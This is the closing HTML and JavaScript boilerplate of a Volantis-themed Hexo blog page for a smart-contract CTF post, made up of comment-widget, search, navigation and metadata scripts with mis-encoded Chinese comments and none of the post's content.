    const script = document.createElement('script');
    script.setAttribute('src', 'https://giscus.app/client.js');
    Object.keys(cfg).forEach(k=>{
      if (k != "theme") {
        script.setAttribute('data-'+k, cfg[k]);
      }
    })
    script.setAttribute('data-theme', volantis.giscus.Theme);
    script.setAttribute('crossorigin', "anonymous");
    HEAD.appendChild(script);
  }

  function dark_giscus() {
    const HEAD = check_giscus();
    if (!HEAD) return;

    const message = {
      setConfig: {
        theme: volantis.giscus.Theme
      }
    };
    const giscusIframe = document.querySelector('iframe.giscus-frame');
    giscusIframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
  }
  pjax_giscus();
  volantis.pjax.push(pjax_giscus);
  volantis.dark.push(dark_giscus);
</script>

    




  <script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/busuanzi/js/busuanzi.pure.mini.js" data-pjax></script>


<!-- optional -->

  <script>
  const SearchServiceDataPathRoot = ("/" || "/").endsWith("/") ?
    "/" || "/" :
    "//" || "/";
  const SearchServiceDataPath = SearchServiceDataPathRoot + "content.json";

  function loadSearchScript() {
    // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
    return volantis.js("/js/search/hexo.js");
  }

  function loadSearchService() {
    loadSearchScript();
    document.querySelectorAll(".input.u-search-input").forEach((e) => {
      e.removeEventListener("focus", loadSearchService, false);
    });

    document.querySelectorAll(".u-search-form").forEach((e) => {
      e.addEventListener("submit", (event) => {
        event.preventDefault();
      }, false);
    });
  }

  // æ‰“å¼€å¹¶æœç´¢ å­—ç¬¦ä¸² s
  function OpenSearch(s) {
    if (typeof SearchService === 'undefined')
      loadSearchScript().then(() => {
        SearchService.setQueryText(s);
        SearchService.search();
      });
    else {
      SearchService.setQueryText(s);
      SearchService.search();
    }
  }

  // è®¿é—®å«æœ‰ ?s=xxx  çš„é“¾æ¥æ—¶æ‰“å¼€æœç´¢ // ä¸æœç´¢å¼•æ“ structured data ç›¸å…³: /scripts/helpers/structured-data/lib/config.js
  if (window.location.search && /^\?s=/g.test(window.location.search)) {
    let queryText = decodeURI(window.location.search)
      .replace(/\ /g, "-")
      .replace(/^\?s=/g, "");
    OpenSearch(queryText);
  }

  // æœç´¢è¾“å…¥æ¡†è·å–ç„¦ç‚¹æ—¶åŠ è½½æœç´¢
  document.querySelectorAll(".input.u-search-input").forEach((e) => {
    e.addEventListener("focus", loadSearchService, false);
  });
</script>







  <script>



  function pjax_highlightjs_copyCode(){
    if (!(document.querySelector(".highlight .code pre") ||
      document.querySelector(".article pre code"))) {
      return;
    }
    VolantisApp.utilCopyCode(".highlight .code pre, .article pre code")
  }
  volantis.requestAnimationFrame(pjax_highlightjs_copyCode)
  volantis.pjax.push(pjax_highlightjs_copyCode)

</script>












  <script>
  function load_swiper() {
    if (!document.querySelectorAll(".swiper-container")[0]) return;
    volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.css");
    volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.js").then(() => {
      pjax_swiper();
    });
  }

  load_swiper();

  function pjax_swiper() {
    volantis.swiper = new Swiper('.swiper-container', {
      slidesPerView: 'auto',
      spaceBetween: 8,
      centeredSlides: true,
      loop: true,
      pagination: {
        el: '.swiper-pagination',
        clickable: true,
      },
      navigation: {
        nextEl: '.swiper-button-next',
        prevEl: '.swiper-button-prev',
      },
    });
  }

  volantis.pjax.push(() => {
    if (!document.querySelectorAll(".swiper-container")[0]) return;
    if (typeof volantis.swiper === "undefined") {
      load_swiper();
    } else {
      pjax_swiper();
    }
  });
</script>


<!-- pjax æ ‡ç­¾å¿…é¡»å­˜åœ¨äºæ‰€æœ‰é¡µé¢ å¦åˆ™ pjax error -->
<pjax>

</pjax>

<script>
  function listennSidebarTOC() {
    const navItems = document.querySelectorAll(".toc li");
    if (!navItems.length) return;
    let targets = []
    const sections = [...navItems].map((element) => {
      const link = element.querySelector(".toc-link");
      const target = document.getElementById(
        decodeURI(link.getAttribute("href")).replace("#", "")
      );
      targets.push(target)
      // è§£é™¤ a æ ‡ç­¾ href çš„ é”šç‚¹å®šä½, a æ ‡ç­¾ href çš„ é”šç‚¹å®šä½ ä¼šéšæœºå¯ç”¨?? äº§ç”Ÿé”™ä½???
      link.setAttribute("onclick","return false;")
      link.setAttribute("toc-action","toc-"+decodeURI(link.getAttribute("href")).replace("#", ""))
      link.setAttribute("href","/")
      // é…ç½® ç‚¹å‡» è§¦å‘æ–°çš„é”šç‚¹å®šä½
      link.addEventListener("click", (event) => {
        event.preventDefault();
        // è¿™é‡Œçš„ addTop æ˜¯é€šè¿‡é”™ä½ä½¿å¾— toc è‡ªåŠ¨å±•å¼€.
        volantis.scroll.to(target,{addTop: 5, observer:true})
        // Anchor id
        history.pushState(null, document.title, "#" + target.id);
      });
      return target;
    });

    function activateNavByIndex(target) {
      if (target.classList.contains("active-current")) return;

      document.querySelectorAll(".toc .active").forEach((element) => {
        element.classList.remove("active", "active-current");
      });
      target.classList.add("active", "active-current");
      let parent = target.parentNode;
      while (!parent.matches(".toc")) {
        if (parent.matches("li")) parent.classList.add("active");
        parent = parent.parentNode;
      }
    }

    // æ–¹æ¡ˆä¸€ï¼š
    volantis.activateNavIndex=0
    activateNavByIndex(navItems[volantis.activateNavIndex])
    volantis.scroll.push(()=>{
      if (targets[0].getBoundingClientRect().top >= 0) {
        volantis.activateNavIndex = 0
      }else if (targets[targets.length-1].getBoundingClientRect().top < 0) {
        volantis.activateNavIndex = targets.length-1
      } else {
        for (let index = 0; index < targets.length; index++) {
          const target0 = targets[index];
          const target1 = targets[(index+1)%targets.length];
          if (target0.getBoundingClientRect().top < 0&&target1.getBoundingClientRect().top >= 0) {
            volantis.activateNavIndex=index
            break;
          }
        }
      }
      activateNavByIndex(navItems[volantis.activateNavIndex])
    })

    // æ–¹æ¡ˆäºŒï¼š
    // IntersectionObserver ä¸æ˜¯å®Œç¾ç²¾ç¡®åˆ°åƒç´ çº§åˆ« ä¹Ÿä¸æ˜¯ä½å»¶æ—¶æ€§çš„
    // function findIndex(entries) {
    //   let index = 0;
    //   let entry = entries[index];
    //   if (entry.boundingClientRect.top > 0) {
    //     index = sections.indexOf(entry.target);
    //     return index === 0 ? 0 : index - 1;
    //   }
    //   for (; index < entries.length; index++) {
    //     if (entries[index].boundingClientRect.top <= 0) {
    //       entry = entries[index];
    //     } else {
    //       return sections.indexOf(entry.target);
    //     }
    //   }
    //   return sections.indexOf(entry.target);
    // }
    // function createIntersectionObserver(marginTop) {
    //   marginTop = Math.floor(marginTop + 10000);
    //   let intersectionObserver = new IntersectionObserver(
    //     (entries, observe) => {
    //       let scrollHeight = document.documentElement.scrollHeight;
    //       if (scrollHeight > marginTop) {
    //         observe.disconnect();
    //         createIntersectionObserver(scrollHeight);
    //         return;
    //       }
    //       let index = findIndex(entries);
    //       activateNavByIndex(navItems[index]);
    //     }, {
    //       rootMargin: marginTop + "px 0px -100% 0px",
    //       threshold: 0,
    //     }
    //   );
    //   sections.forEach((element) => {
    //     element && intersectionObserver.observe(element);
    //   });
    // }
    // createIntersectionObserver(document.documentElement.scrollHeight);
  }

  document.addEventListener("DOMContentLoaded", ()=>{
    volantis.requestAnimationFrame(listennSidebarTOC)
  });
  document.addEventListener("pjax:success", ()=>{
    volantis.requestAnimationFrame(listennSidebarTOC)
  });
</script>



<script>
  document.onreadystatechange = function () {
    if (document.readyState == 'complete') {
      // é¡µé¢åŠ è½½å®Œæ¯• æ ·å¼åŠ è½½å¤±è´¥ï¼Œæˆ–æ˜¯å½“å‰ç½‘é€Ÿæ…¢ï¼Œæˆ–æ˜¯å¼€å¯äº†çœæµæ¨¡å¼
      const { saveData, effectiveType } = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {}
      if (getComputedStyle(document.querySelector("#safearea"), null)["display"] == "none" || saveData || /2g/.test(effectiveType)) {
        document.querySelectorAll(".reveal").forEach(function (e) {
          e.style["opacity"] = "1";
        });
        document.querySelector("#safearea").style["display"] = "block";
      }
    }
  }
</script>


  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"BY_DLIFEğŸ‰","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"BY_DLIFEğŸ‰","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"BY_DLIFEğŸ‰"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/CTFProtocol/","name":"CTFProtocol"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/09/01/Smart contracts/CTFProtocol/CTFProtocol/","name":"CTFProtocol-2022ï¼ˆ11ï¼‰"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"BY_DLIFEğŸ‰","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"BY_DLIFEğŸ‰","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"BY_DLIFEğŸ‰","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"CTFProtocol-2022ï¼ˆ11ï¼‰","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/"},"author":{"@type":"Person","name":"BY_DLIFEğŸ‰","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"BY_DLIFEğŸ‰","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/","wordCount":0,"datePublished":"2023-09-01T04:50:10.000Z","dateModified":"2023-09-01T04:50:10.000Z","articleSection":"Smart contracts","keywords":"soliditiy,é¶åœº","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>



      
        <!--
  pjaxé‡è½½åŒºåŸŸæ¥å£ï¼š
  1.  <pjax></pjax> æ ‡ç­¾ pjax æ ‡ç­¾å¿…é¡»å­˜åœ¨äºæ‰€æœ‰é¡µé¢ å¦åˆ™ pjax error
  2.  script[data-pjax]
  3.  .pjax-reload script
  4.  .pjax
-->



<script src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/pjax/pjax.min.js"></script>


<script>
    var pjax;
    document.addEventListener('DOMContentLoaded', function () {
      pjax = new Pjax({
        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox]):not([onclick="return false;"]):not([onclick="return!1"]):not([target="_blank"]):not([target="view_window"]):not([href$=".xml"])',
        selectors: [
          "head title",
          "head meta[name=keywords]",
          "head meta[name=description]",
          
          "#l_main",
          "#pjax-header-nav-list",
          ".pjax",
          "pjax", // <pjax></pjax> æ ‡ç­¾
          "script[data-pjax], .pjax-reload script" // scriptæ ‡ç­¾æ·»åŠ data-pjax æˆ– scriptæ ‡ç­¾å¤–å±‚æ·»åŠ .pjax-reload çš„scriptä»£ç æ®µé‡è½½
        ],
        cacheBust: false,   // url åœ°å€è¿½åŠ æ—¶é—´æˆ³ï¼Œç”¨ä»¥é¿å…æµè§ˆå™¨ç¼“å­˜
        timeout: 5000,
        
      });
    });

    document.addEventListener('pjax:send', function (e) {
      //window.stop(); // ç›¸å½“äºç‚¹å‡»äº†æµè§ˆå™¨çš„åœæ­¢æŒ‰é’®

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      // ä½¿ç”¨ volantis.pjax.send æ–¹æ³•ä¼ å…¥pjax:sendå›è°ƒå‡½æ•° å‚è§layout/_partial/scripts/global.ejs
      volantis.pjax.method.send.start();
    });

    document.addEventListener('pjax:complete', function () {
      // ä½¿ç”¨ volantis.pjax.push æ–¹æ³•ä¼ å…¥é‡è½½å‡½æ•° å‚è§layout/_partial/scripts/global.ejs
      volantis.pjax.method.complete.start();
    });

    document.addEventListener('pjax:error', function (e) {
      if(volantis.debug) {
        console.error(e);
        console.log('pjax error: \n' + JSON.stringify(e));
      }else{
        // ä½¿ç”¨ volantis.pjax.error æ–¹æ³•ä¼ å…¥pjax:errorå›è°ƒå‡½æ•° å‚è§layout/_partial/scripts/global.ejs
        volantis.pjax.method.error.start();
        window.location.href = e.triggerElement.href;
      }
    });
</script>

      
    </div>
    <!-- import body_end begin-->
    <!-- import body_end end-->
    <!-- Custom Files bodyEnd begin-->
    
    <!-- Custom Files bodyEnd end-->
    <!-- front-matter body_end begin -->
    <!-- front-matter body_end end -->
  </body>
</html>
